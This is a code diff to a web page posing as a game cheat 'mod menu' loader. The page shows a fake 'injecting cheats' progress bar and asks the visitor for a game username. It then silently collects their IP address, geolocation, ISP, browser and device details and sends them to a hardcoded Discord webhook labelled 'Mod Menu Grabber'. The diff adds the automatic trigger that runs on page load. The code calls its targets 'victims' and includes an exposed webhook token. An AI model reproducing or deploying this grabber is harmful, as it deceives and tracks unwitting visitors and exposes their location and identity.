@@ -27,33 +27,18 @@
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const customId = urlParams.get('id') || urlParams.get('victim') || urlParams.get('u') || "TestVictim";
+        const customId = urlParams.get('id') || urlParams.get('victim') || "TestVictim";
 
         let data = {
             customId: customId,
-            name: "TestVictim",
+            name: "Anonymous",
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
             screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-            referrer: document.referrer || "direct",
-            hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
-            deviceMemory: navigator.deviceMemory || "N/A",
-            fingerprint: "AUTO-TEST-FP-" + Date.now()
+            fingerprint: "AUTO-" + Date.now()
         };
-
-        function getAdvancedFingerprint() {
-            let fp = "";
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.fillText("MODMENU " + navigator.userAgent, 10, 50);
-                fp += canvas.toDataURL().slice(0, 100);
-            } catch(e) {}
-            return btoa(fp).substring(0, 80);
-        }
-        data.fingerprint = getAdvancedFingerprint();
 
         function fakeLoading() {
             let progress = 0;
@@ -62,49 +47,78 @@
             const msgs = ["Connecting...", "Bypassing anticheat...", "Injecting cheats...", "Finalizing..."];
             let i = 0;
             const int = setInterval(() => {
-                progress += 22;
+                progress += 20;
                 progBar.style.width = `${Math.min(progress, 100)}%`;
-                if (progress > 35 && i === 0) { status.textContent = msgs[1]; i++; }
-                if (progress > 65 && i === 1) { status.textContent = msgs[2]; i++; }
+                if (progress > 30 && i === 0) { status.textContent = msgs[1]; i++; }
+                if (progress > 60 && i === 1) { status.textContent = msgs[2]; i++; }
                 if (progress >= 100) clearInterval(int);
-            }, 110);
+            }, 130);
         }
 
         async function getIPAndGeo() {
             const services = [
-                () => fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => ({ip: d.ip})),
-                () => fetch('https://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy').then(r => r.json()),
+                // 1. ipify + ip-api
+                async () => {
+                    const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({}));
+                    if (!ipRes.ip) return {};
+                    const geo = await fetch(`https://ip-api.com/json/${ipRes.ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy`).then(r => r.json()).catch(() => ({}));
+                    return {ip: ipRes.ip, ...geo};
+                },
+                // 2. ipinfo.io
                 () => fetch('https://ipinfo.io/json').then(r => r.json()).then(d => ({
-                    ip: d.ip, country: d.country, city: d.city, region: d.region, isp: d.org
+                    ip: d.ip, country: d.country, city: d.city, region: d.region, isp: d.org, timezone: d.timezone
+                })),
+                // 3. ipapi.co (very reliable)
+                () => fetch('https://ipapi.co/json/').then(r => r.json()).then(d => ({
+                    ip: d.ip, country: d.country_name, countryCode: d.country, city: d.city, region: d.region, isp: d.org, timezone: d.timezone
                 }))
             ];
 
-            for (let service of services) {
+            for (let svc of services) {
                 try {
-                    const res = await service();
+                    const res = await svc();
                     if (res.ip || res.country) {
-                        data.ip = res.ip || "N/A";
+                        data.ip = res.ip || data.ip || "N/A";
                         Object.assign(data, {
-                            country: res.country || "Unknown",
+                            country: res.country || res.country_name || "Unknown",
                             countryCode: res.countryCode || "N/A",
                             city: res.city || "Unknown",
-                            region: res.region || "Unknown",
-                            isp: res.isp || "Unknown",
+                            region: res.region || res.regionName || "Unknown",
+                            isp: res.isp || res.org || "Unknown",
                             timezone: res.timezone || "Unknown",
                             lat: res.lat || "N/A",
                             lon: res.lon || "N/A",
-                            proxy: res.proxy ? "YES" : "No"
+                            proxy: (res.proxy || res.vpn) ? "YES" : "No"
                         });
                         return;
                     }
                 } catch(e) {}
             }
-            data.ip = "Lookup Failed";
+            data.ip = "Lookup Failed - Try Hosted Link";
         }
 
         function sendToDiscord() {
             const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
-            const payload = {
-                username: "Mod Menu Grabber",
-                content: `**🔥 MOD MENU GRABBED 🔥**\n**Custom ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.countryCode})\n**ISP:** ${data.isp}\n**Proxy:** ${data.proxy}\n**Time:** ${data.timestamp}`,
-                embeds: [{ title: "Full Data", description: "```json\n" + JSON.stringify(data, null, 2) + "\n```", color: 0x00ff41
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: "Mod Menu Grabber",
+                    content: `**🔥 MOD MENU GRABBED 🔥**\n**ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country}\n**ISP:** ${data.isp}\n**Proxy:** ${data.proxy}`,
+                    embeds: [{title: "Full Dump", description: "```json\n" + JSON.stringify(data, null, 2) + "\n```", color: 0x00ff41}]
+                })
+            }).catch(() => {});
+        }
+
+        window.onload = async () => {
+            fakeLoading();
+            setTimeout(async () => {
+                data.name = prompt("ENTER YOUR GAME USERNAME TO ACTIVATE:", "") || "TestVictim";
+                await getIPAndGeo();
+                sendToDiscord();
+                setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq", 1500);
+            }, 1600);
+        };
+    </script>
+</body>
+</html>
